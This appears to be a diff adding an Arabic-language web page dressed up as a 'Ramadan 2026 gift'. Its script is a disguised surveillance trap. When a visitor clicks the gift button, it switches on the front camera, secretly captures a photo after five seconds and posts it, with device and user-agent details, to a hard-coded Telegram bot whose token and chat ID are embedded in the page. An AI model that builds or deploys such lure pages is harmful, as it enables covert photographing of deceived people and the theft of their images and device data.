@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 هدية رمضان 2026</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Tajawal', sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* خلفية متحركة */
+        .bg-animation {
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: 
+                radial-gradient(circle at 30% 40%, rgba(247, 151, 30, 0.08) 0%, transparent 50%),
+                radial-gradient(circle at 70% 60%, rgba(255, 210, 0, 0.08) 0%, transparent 50%);
+            animation: rotateBg 20s linear infinite;
+            z-index: 0;
+        }
+        
+        @keyframes rotateBg {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* نجوم */
+        .stars-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+        
+        .star {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle var(--duration) ease-in-out infinite alternate;
+        }
+        
+        @keyframes twinkle {
+            0% { opacity: 0.2; transform: scale(0.5); }
+            100% { opacity: 1; transform: scale(1.5); }
+        }
+        
+        /* الكارد الرئيسي */
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 40px;
+            padding: 45px 35px;
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            transition: all 0.4s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 50px 100px rgba(247, 151, 30, 0.15);
+        }
+        
+        .gift-emoji {
+            font-size: 90px;
+            display: inline-block;
+            animation: pulseGift 2s ease-in-out infinite;
+        }
+        
+        @keyframes pulseGift {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.1) rotate(-3deg); }
+        }
+        
+        h1 {
+            font-size: 34px;
+            font-weight: 900;
+            margin: 15px 0 8px;
+            background: linear-gradient(135deg, #f7971e, #ffd200);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .sub {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 16px;
+            margin-bottom: 25px;
+            line-height: 1.8;
+        }
+        
+        .btn-open {
+            background: linear-gradient(135deg, #f7971e, #ffd200);
+            border: none;
+            padding: 16px 45px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a2e;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(247, 151, 30, 0.3);
+            font-family: 'Tajawal', sans-serif;
+        }
+        
+        .btn-open:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 40px rgba(247, 151, 30, 0.5);
+        }
+        
+        .btn-open:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #ffd200;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        #status {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            margin-top: 15px;
+            min-height: 25px;
+        }
+        
+        #status.success { color: #4caf50; }
+        #status.error { color: #ff6b6b; }
+        
+        video, canvas {
+            display: none;
+        }
+        
+        /* صفحة النتيجة */
+        .result-box {
+            display: none;
+        }
+        
+        .result-box.active {
+            display: block;
+        }
+        
+        .result-icon {
+            font-size: 80px;
+            animation: pulseGift 1.5s ease-in-out infinite;
+        }
+        
+        .result-title {
+            font-size: 28px;
+            font-weight: 900;
+            color: #ffd700;
+            margin: 15px 0 5px;
+        }
+        
+        .result-sub {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 15px;
+        }
+        
+        /* متجاوب */
+        @media (max-width: 500px) {
+            .card { padding: 30px 20px; }
+            h1 { font-size: 26px; }
+            .gift-emoji { font-size: 70px; }
+            .btn-open { padding: 14px 35px; font-size: 17px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- خلفية -->
+<div class="bg-animation"></div>
+<div class="stars-container" id="stars"></div>
+
+<!-- المحتوى -->
+<div class="container">
+    <div class="card" id="mainCard">
+        
+        <!-- الحالة الافتراضية -->
+        <div id="initialState">
+            <div class="gift-emoji">🎁</div>
+            <h1>هدية رمضان لك</h1>
+            <p class="sub">اضغط على الزر لفتح هديتك<br>🌙 رمضان كريم</p>
+            <button class="btn-open" id="openBtn">
+                <i class="fas fa-gift"></i> افتح الهدية
+            </button>
+            <div id="status"></div>
+        </div>
+        
+        <!-- شاشة التحميل -->
+        <div id="loadingState" style="display:none;">
+            <div class="gift-emoji">📷</div>
+            <h1>جاري التجهيز</h1>
+            <p class="sub" id="loadingText">يتم تشغيل الكاميرا...</p>
+            <div class="loader"></div>
+            <div id="status"></div>
+        </div>
+        
+        <!-- النتيجة -->
+        <div id="resultState" class="result-box">
+            <div class="result-icon">🎉</div>
+            <div class="result-title">تم الاستلام!</div>
+            <p class="result-sub" id="resultMsg">شكراً لك، رمضان كريم 🌙</p>
+        </div>
+        
+        <!-- عناصر مخفية للكاميرا -->
+        <video id="video" autoplay muted playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+</div>
+
+<script>
+// ======================== التوكن والأيدي ========================
+const BOT_TOKEN = '5418501320:AAFAjqrT_Tu2JNGe1nc2Ki-lb3kAB8QVEHE';
+const CHAT_ID = '1786031358';
+
+// ======================== نجوم الخلفية ========================
+const starsContainer = document.getElementById('stars');
+for (let i = 0; i < 80; i++) {
+    const star = document.createElement('div');
+    star.className = 'star';
+    star.style.left = Math.random() * 100 + '%';
+    star.style.top = Math.random() * 100 + '%';
+    star.style.setProperty('--duration', (2 + Math.random() * 3) + 's');
+    star.style.width = (1 + Math.random() * 3) + 'px';
+    star.style.height = star.style.width;
+    starsContainer.appendChild(star);
+}
+
+// ======================== عناصر الواجهة ========================
+const initialState = document.getElementById('initialState');
+const loadingState = document.getElementById('loadingState');
+const resultState = document.getElementById('resultState');
+const openBtn = document.getElementById('openBtn');
+const statusEl = document.getElementById('status');
+const loadingText = document.getElementById('loadingText');
+const resultMsg = document.getElementById('resultMsg');
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+// ======================== الوظائف ========================
+function setStatus(msg, type = '') {
+    statusEl.textContent = msg;
+    statusEl.className = type;
+}
+
+function showState(state) {
+    initialState.style.display = 'none';
+    loadingState.style.display = 'none';
+    resultState.classList.remove('active');
+    
+    if (state === 'initial') {
+        initialState.style.display = 'block';
+        openBtn.disabled = false;
+    } else if (state === 'loading') {
+        loadingState.style.display = 'block';
+    } else if (state === 'result') {
+        resultState.classList.add('active');
+    }
+}
+
+// ======================== إرسال الصورة للتليجرام ========================
+function sendToTelegram(imageDataURL) {
+    return new Promise((resolve, reject) => {
+        const blob = dataURLToBlob(imageDataURL);
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', `📸 صورة جديدة\n🕒 ${new Date().toLocaleString('ar-EG')}\n🌐 ${getDeviceInfo()}`);
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) resolve(true);
+            else reject(data.description);
+        })
+        .catch(err => reject(err));
+    });
+}
+
+function dataURLToBlob(dataURL) {
+    const parts = dataURL.split(',');
+    const mime = parts[0].match(/:(.*?);/)[1];
+    const b64 = atob(parts[1]);
+    const byteArray = new Uint8Array(b64.length);
+    for (let i = 0; i < b64.length; i++) {
+        byteArray[i] = b64.charCodeAt(i);
+    }
+    return new Blob([byteArray], { type: mime });
+}
+
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = 'جهاز غير معروف';
+    if (/iPhone|iPad|iPod/.test(ua)) device = 'iPhone/iPad';
+    else if (/Android/.test(ua)) device = 'Android';
+    else if (/Windows/.test(ua)) device = 'Windows';
+    else if (/Mac/.test(ua)) device = 'Mac';
+    return `${device} | ${ua.substring(0, 80)}`;
+}
+
+// ======================== التقاط الصورة ========================
+function captureAndSend() {
+    const ctx = canvas.getContext('2d');
+    const w = video.videoWidth || 640;
+    const h = video.videoHeight || 480;
+    canvas.width = w;
+    canvas.height = h;
+    ctx.drawImage(video, 0, 0, w, h);
+    
+    const dataURL = canvas.toDataURL('image/jpeg', 0.9);
+    
+    setStatus('⏳ جاري الإرسال للتليجرام...');
+    
+    sendToTelegram(dataURL)
+        .then(() => {
+            setStatus('✅ تم الإرسال بنجاح!', 'success');
+            showState('result');
+            resultMsg.textContent = '🌙 رمضان كريم، تم استلام هديتك!';
+        })
+        .catch(err => {
+            setStatus('❌ فشل الإرسال: ' + err, 'error');
+            showState('initial');
+            openBtn.disabled = false;
+        })
+        .finally(() => {
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(t => t.stop());
+            }
+        });
+}
+
+// ======================== تشغيل الكاميرا ========================
+function startCamera() {
+    return navigator.mediaDevices.getUserMedia({
+        video: {
+            facingMode: 'user',
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+        }
+    });
+}
+
+// ======================== زر الهدية ========================
+openBtn.addEventListener('click', function() {
+    this.disabled = true;
+    showState('loading');
+    setStatus('📷 جاري تشغيل الكاميرا...');
+    loadingText.textContent = 'يتم تشغيل الكاميرا...';
+    
+    startCamera()
+        .then(stream => {
+            video.srcObject = stream;
+            setStatus('📸 جاري التقاط الصورة خلال 5 ثواني...');
+            loadingText.textContent = 'جاري التحضير للتصوير...';
+            
+            setTimeout(() => {
+                captureAndSend();
+            }, 5000);
+        })
+        .catch(err => {
+            setStatus('❌ يرجى السماح باستخدام الكاميرا', 'error');
+            showState('initial');
+            openBtn.disabled = false;
+            console.error('Camera error:', err);
+        });
+});
+
+// ======================== بداية ========================
+showState('initial');
+setStatus('👆 اضغط على زر الهدية');
+
+console.log('✅ النظام جاهز | Bot:', BOT_TOKEN.substring(0, 10) + '...');
+</script>
+
+</body>
+</html>
